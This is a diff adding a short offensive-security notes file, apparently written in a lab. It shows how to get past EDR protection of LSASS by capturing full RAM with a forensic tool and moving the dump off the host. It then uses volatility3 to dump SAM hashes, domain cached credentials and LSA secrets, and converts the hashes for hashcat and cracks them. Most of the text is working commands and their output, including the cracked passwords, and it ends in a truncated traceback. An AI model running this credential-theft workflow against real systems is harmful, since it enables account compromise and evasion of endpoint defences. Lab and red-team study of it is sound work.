@@ -1,0 +1,92 @@
+
+I read this https://medium.com/@balqurneh/bypass-crowdstrike-falcon-edr-protection-against-process-dump-like-lsass-exe-3c163e1b8a3e and it got me interested.
+
+You can download magnetforensics RAM capture here https://support.magnetforensics.com/s/article/Acquire-Memory-with-MAGNET-RAM-Capture
+Start RAM capture tool on the host you wish to capture the dump from. Then exfiltrate the dump file, during testing the dumps were large (5GB).
+
+To extract data from the dump you need volatility3: https://github.com/volatilityfoundation/volatility3
+
+To install volatility3 with all it’s require dependencies in Ubuntu I had to install the following:
+
+sudo apt-get install libffi-dev
+sudo apt-get install libssl-dev
+sudo apt-get install libxml2-dev libxslt1-dev
+sudo apt install python3-dev
+sudo apt install libblas-dev libatlas-base-dev
+sudo apt install python3-pip
+
+Then
+
+git clone https://github.com/volatilityfoundation/volatility3.git
+cd volatility3
+pip3 install -r requirements.txt
+
+-----------------------
+
+To extract the local SAM
+
+ubuntu@ubuntu:~/Documents/volatility3$ python3 vol.py -f memdump.raw windows.hashdump.Hashdump
+Volatility 3 Framework 2.4.2
+Progress:  100.00		PDB scanning finished                        
+User	rid	lmhash	nthash
+
+Administrator	500	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
+Guest	501	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
+DefaultAccount	503	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
+WDAGUtilityAccount	504	aad3b435b51404eeaad3b435b51404ee	0dd51cf51cf001b5c3dae49acb9e2d36
+ieuser	1001	aad3b435b51404eeaad3b435b51404ee	fc525c9683e8fe067095ba2ddc971889
+
+
+---------------------------
+
+To extract MS Cache 2 domain cached credentials
+
+windows.cachedump.Cachedump = Domain Cached Credentials 2 (DCC2), MS Cache 2 
+
+ubuntu@ubuntu:~/Documents/volatility3$ python3 vol.py -f memdump.raw windows.cachedump.Cachedump
+Volatility 3 Framework 2.4.2
+Progress:  100.00		PDB scanning finished                        
+Username	Domain	Domain name	Hash
+
+user1	HACKLAB	HACKLAB.LOCAL	54 cc 5e f6 ef 23 15 b1 2a 71 87 a5 f3 09 51 c3
+DA1	HACKLAB	HACKLAB.LOCAL	ee 7d 3a c2 5b 7d c4 a5 61 58 76 96 da c4 4e 12
+c.gray	HACKLAB	HACKLAB.LOCAL	0b d5 7f ce 56 b8 47 68 92 77 69 4e 90 af 1d 0d
+user3	HACKLAB	HACKLAB.LOCAL	98 72 90 65 1f f0 5a e7 d3 b4 58 ab 70 e5 96 e9
+
+
+You then need to convert the hashes to a format hashcat understands
+
+From this
+
+user1	HACKLAB	HACKLAB.LOCAL	54 cc 5e f6 ef 23 15 b1 2a 71 87 a5 f3 09 51 c3
+DA1	HACKLAB	HACKLAB.LOCAL	ee 7d 3a c2 5b 7d c4 a5 61 58 76 96 da c4 4e 12
+c.gray	HACKLAB	HACKLAB.LOCAL	0b d5 7f ce 56 b8 47 68 92 77 69 4e 90 af 1d 0d
+user3	HACKLAB	HACKLAB.LOCAL	98 72 90 65 1f f0 5a e7 d3 b4 58 ab 70 e5 96 e9
+
+To these
+
+$DCC2$10240#user1#54cc5ef6ef2315b12a7187a5f30951c3
+$DCC2$10240#DA1#ee7d3ac25b7dc4a561587696dac44e12
+$DCC2$10240#c.gray#0bd57fce56b847689277694e90af1d0d
+$DCC2$10240#user3#987290651ff05ae7d3b458ab70e596e9
+
+
+hashcat.exe -m 2100 C:\Hash2.txt C:\Password_list.txt --potfile-disable
+
+Hashcat cracked
+
+$DCC2$10240#da1#ee7d3ac25b7dc4a561587696dac44e12:Passw0rd!
+$DCC2$10240#user1#54cc5ef6ef2315b12a7187a5f30951c3:Passw0rd!
+$DCC2$10240#c.gray#0bd57fce56b847689277694e90af1d0d:Passw0rd!
+
+---------------------------
+
+LSA Secrets
+
+python3 vol.py -f memdump2.raw windows.lsadump.Lsadump
+Volatility 3 Framework 2.4.2
+Progress:  100.00		PDB scanning finished                        
+Key	Secret	Hex
+
+$MACHINE.ACC	ð^0i9O8JG@47mX,>[xxqG>45pu/Tx*q-7wWpVj?KjW;'vcli mv=XTqcU [AVO[dW!oj? %38/G³²ð±göí
+%3	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 7a 8b b3 b2 f0 b1 01 67 33Traceback (most recent call last):
